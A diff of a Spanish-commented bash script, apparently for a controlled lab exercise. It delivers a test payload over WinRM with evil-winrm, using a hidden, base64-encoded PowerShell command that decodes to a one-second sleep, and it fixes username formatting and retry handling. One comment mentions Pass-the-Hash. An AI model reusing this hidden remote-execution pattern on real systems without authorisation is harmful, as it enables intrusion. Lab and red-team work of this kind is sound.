@@ -12,15 +12,20 @@ echo "[+] Entregando y ejecutando payload de prueba en ${TARGET} via WinRM (evil
 # Requiere credenciales validas de un usuario local/dominio para el ejercicio controlado
 read -rp "Usuario WinRM: " WU
 read -rsp "Password WinRM: " WP; echo
+# Normalizar el formato del usuario: lab.env usa "DOMINIO/usuario" (barra
+# normal, formato de Impacket). evil-winrm, en cambio, espera "DOMINIO\usuario"
+# (barra invertida); si recibe la barra normal la toma como parte literal del
+# nombre de usuario y la autenticacion falla con WinRMAuthorizationError
+# (aunque las credenciales sean validas). Se convierte '/' -> '\'.
+WU="${WU//\//\\}"
 CMD='powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQA='
 LOGF="/tmp/payload_$(date +%s).log"
 # evil-winrm no tiene un flag para ejecutar un solo comando (-e es la ruta de
 # ejecutables C#, no un comando); es una shell interactiva, así que el
 # comando se envía por stdin como si se hubiera escrito en el prompt remoto.
-# Reintentos: el endpoint WinRM puede devolver un WinRMAuthorizationError
-# transitorio bajo carga (p.ej. justo tras un Pass-the-Hash contra el mismo
-# dominio). Se reintenta hasta 4 veces para no registrar como "ejecutado" un
-# intento que realmente falló por un hiccup de autenticación momentáneo.
+# Reintentos: por si el endpoint WinRM devuelve un error transitorio bajo
+# carga, se reintenta hasta 4 veces y solo se da por exitoso si aparece
+# "Connection successful".
 OK=0
 for intento in 1 2 3 4; do
   { echo "${CMD}"; echo "exit"; } | evil-winrm -i "${TARGET}" -u "${WU}" -p "${WP}" > "$LOGF" 2>&1 || true
